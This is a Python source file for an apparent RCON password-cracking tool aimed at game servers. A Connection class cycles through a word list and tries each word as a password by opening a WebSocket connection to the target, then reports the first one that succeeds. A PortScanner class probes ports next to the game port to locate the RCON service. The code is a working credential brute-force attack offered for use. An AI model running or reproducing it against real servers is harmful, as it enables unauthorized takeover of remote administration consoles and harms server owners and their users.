import asyncio
import websockets
from Methods import word_list_ex
from urllib.parse import quote
from Methods import BruteForce
from Methods import WordList
import socket


class Connection:
    def __init__(self, host: str, word_list: WordList, brute_force: BruteForce):
        self.uri = f"ws://{host}/"
        self.brute_force = brute_force
        self.word_list = word_list

    async def start(self) -> (str, bool):
        password: str = ''
        ws = None
        while True:

            if self.brute_force.active:
                self.brute_force.active = False
                continue
            elif self.word_list.active:
                try:
                    password = self.word_list.get_next()
                except word_list_ex.EndOfTheList:
                    # print("WordList finished!")
                    continue
            else:
                break

            # print(f"[{password}] ", end='')
            try:
                ws = await websockets.connect(self.uri + quote(password, safe=''))
                # print("[SUCCESS]")
                break
            except:
                # print("[FAILED]")
                pass

            await asyncio.sleep(0.1)

        if ws is not None:
            await ws.close()
            return f"[{self.uri}] Success, the password for is: <{password}>", True
        else:
            return f"[{self.uri}] All methods failed!", False


class PortScanner:
    @staticmethod
    def _is_open(ip: str, port: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        try:
            sock.connect((ip, port))
            sock.close()
            return True
        except:
            return False

    @staticmethod
    def get_rcon(ip: str, port: int) -> int:
        ports: list = [
            port+1,
            port+2,
            port+3,
            port-1,
            port-2,
        ]

        for prob_port in ports:
            if PortScanner._is_open(ip, prob_port):
                return prob_port
        raise PortScannerExc()


class PortScannerExc(Exception):
    def __init__(self, message="Could't find RCON port"):
        self.message = message
        super().__init__(self.message)

